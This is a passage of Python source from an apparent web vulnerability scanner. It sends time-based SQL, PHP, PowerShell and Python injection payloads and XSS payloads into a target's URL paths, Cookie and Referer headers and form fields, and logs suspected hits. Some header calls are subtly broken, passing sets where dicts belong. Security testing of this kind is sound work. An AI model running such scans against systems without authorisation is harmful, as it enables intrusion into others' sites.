                       hits.append(f"mysql injection in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"mysql injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"mysql injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"mysql injection in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"mysql injection in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for oracle injection
            for mal in mal_oracle:
                print(CYAN + f"checking: {_} with oracle injection payload {mal}")
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"oracle injection in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"oracle injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"oracle injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"oracle injection in cookie ({mal}): {_}")

                except:
                    pass
                        
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"oracle injection in referer ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"oracle injection in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"oracle injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"oracle injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"oracle injection in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"oracle injection in forms: {_} | {field_dict}")

                    except:
                        pass
                                

            # check for php injection
            for mal in mal_php:
                print(CYAN + f"checking: {_} with php payload {mal}")
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"php injection in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"php injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"php injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"php injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"php injection in referer ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"php injection in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"php injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"php injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"php injection in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"php injection in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for postgresql injection
            for mal in mal_postgresql:
                print(CYAN + f"checking: {_} with postgresql injection payload {mal}")
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"postgresql injection in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"postgresql injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"postgresql injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"postgresql injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"postgresql injection in referer ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"postgresql injection in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"postgresql injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"postgresql injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"postgresql injection in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"postgresql injection in forms: {_} | {field_dict}")

                    except:
                        pass
                                
            # check for powershell injection
            for mal in mal_powershell:
                print(CYAN + f"checking: {_} with powershell injection payload {mal}")
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"powershell injection in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"powershell injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"powershell injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"powershell injection in cookie ({mal}): {_}")

                except:
                    pass
                
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"powershell injection in referer ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"powershell injection in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"powershell injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"powershell injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"powershell injection in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"powershell injection in forms: {_} | {field_dict}")

                    except:
                        pass
                                

            # check for python injection
            for mal in mal_python:
                print(CYAN + f"checking: {_} with python injection payload {mal}")
                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_ + "/" + mal, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"python injection in url: {_}/{mal}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"python injection in url: {_}/{mal}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Cookie",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"python injection in cookie ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"python injection in cookie ({mal}): {_}")

                except:
                    pass

                try:
                    time.sleep(delay)
                    start = time.time()
                    data = text(_, headers = {"Referer",mal}, timeout=120)
                    end = time.time()
                    if end - start >= 55:
                        hits.append(f"python injection in referer ({mal}): {_}")

                except HTTPError as error:
                    if error.code == 504:
                        hits.append(f"python injection in referer ({mal}): {_}")

                except:
                    pass
                
                for form in forms:
                    field_list = []
                    input_field = re.findall("<input.+?>",form)
                    try:
                        action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                        if action_field.startswith("/"):
                            action = _ + action_field

                        elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                            action = _ + "/" + action_field

                        else:
                            action = action_field
                            
                    except IndexError:
                        pass

                    try:
                        method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                        for in_field in input_field:
                            if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                try:
                                    value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                
                                except IndexError:
                                    value_field = ""
                                
                                if type_field == "submit" or type_field == "hidden":
                                    field_list.append({name_field:value_field})


                                if type_field != "submit" and type_field != "hidden":
                                    field_list.append({name_field:mal})

                                field_dict = field_list[0]
                                for init_field_dict in field_list[1:]:
                                    field_dict.update(init_field_dict)

                                time.sleep(delay)

                                if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                    start = time.time()
                                    data = text(action,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"python injection in forms: {action} | {field_dict}")

                                else:
                                    start = time.time()
                                    data = text(_,method=method_field,data=field_dict, timeout=120)
                                    end = time.time()
                                    if end - start >= 55:
                                        hits.append(f"python injection in forms: {_} | {field_dict}")

                    except HTTPError as error:
                        if error.code == 504:
                            if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                hits.append(f"python injection in forms: {action} | {field_dict}")

                            else:
                                hits.append(f"python injection in forms: {_} | {field_dict}")

                    except:
                        pass

            # check for xss
            for mal in mal_xss:
                if "%" not in mal and "\\u" not in mal.lower() and not re.search("cu.*%", mal.lower()) and not re.search("%.*cu", mal.lower()):
                    print(CYAN + f"checking: {_} with xss payload {mal}")
                    try:
                        time.sleep(delay)
                        data = text(_ + "/" + mal)
                        if mal in data:
                            hits.append(f"xss in url: {_}/{mal}")

                    except HTTPError as error:
                        pass

                    except:
                        pass

                    try:
                        time.sleep(delay)
                        data = text(_, headers = {"Cookie",mal})
                        if mal in data:
                            hits.append(f"xss in cookie ({mal}): {_}")

                    except HTTPError as error:
                        pass

                    except:
                        pass

                    try:
                        time.sleep(delay)
                        data = text(_, headers = {"Referer",mal})
                        if mal in data:
                            hits.append(f"xss in referer ({mal}): {_}")

                    except HTTPError as error:
                        pass

                    except:
                        pass
                    
                    for form in forms:
                        field_list = []
                        input_field = re.findall("<input.+?>",form)
                        try:
                            action_field = re.findall("action\s*=\s*[\"\'](\S+)[\"\']",form)[0]
                            if action_field.startswith("/"):
                                action = _ + action_field

                            elif not action_field.startswith("/") and not action_field.startswith("http://") and not action_field.startswith("https://"):
                                action = _ + "/" + action_field

                            else:
                                action = action_field
                                
                        except IndexError:
                            pass

                        try:
                            method_field = re.findall("method\s*=\s*[\"\'](\S+)[\"\']",form)[0].upper()
                            for in_field in input_field:
                                if re.search("name\s*=\s*[\"\'](\S+)[\"\']",in_field) and re.search("type\s*=\s*[\"\'](\S+)[\"\']",in_field):
                                    name_field = re.findall("name\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                    type_field = re.findall("type\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                    
                                    try:
                                        value_field = re.findall("value\s*=\s*[\"\'](\S+)[\"\']",in_field)[0]
                                    
                                    except IndexError:
                                        value_field = ""
                                    
                                    if type_field == "submit" or type_field == "hidden":
                                        field_list.append({name_field:value_field})


                                    if type_field != "submit" and type_field != "hidden":
                                        field_list.append({name_field:mal})

                                    field_dict = field_list[0]
                                    for init_field_dict in field_list[1:]:
                                        field_dict.update(init_field_dict)

                                    time.sleep(delay)

                                    if action and urllib.parse.urlparse(host).netloc in urllib.parse.urlparse(action).netloc:
                                        data = text(action,method=method_field,data=field_dict)
                                        if mal in data:
                                            hits.append(f"xss in forms: {action} | {field_dict}")

                                    else:
                                        data = text(_,method=method_field,data=field_dict)
                                        if mal in data:
                                            hits.append(f"xss in forms: {_} | {field_dict}")

                        except HTTPError as error:
                            pass

                        except:
                            pass

    clear()
    hits = list(set(hits[:]))
    hits.sort()

    if len(hits) > 0:
        for hit in hits:
            print(RED + hit)
            with open("cobra.log", "a") as file:
                file.write(hit + "\n")

    else:
        print(GREEN + f"we didn't find anything interesting on {host}")
        with open("cobra.log", "a") as file:
            file.write(f"we didn't find anything interesting on {host}\n")
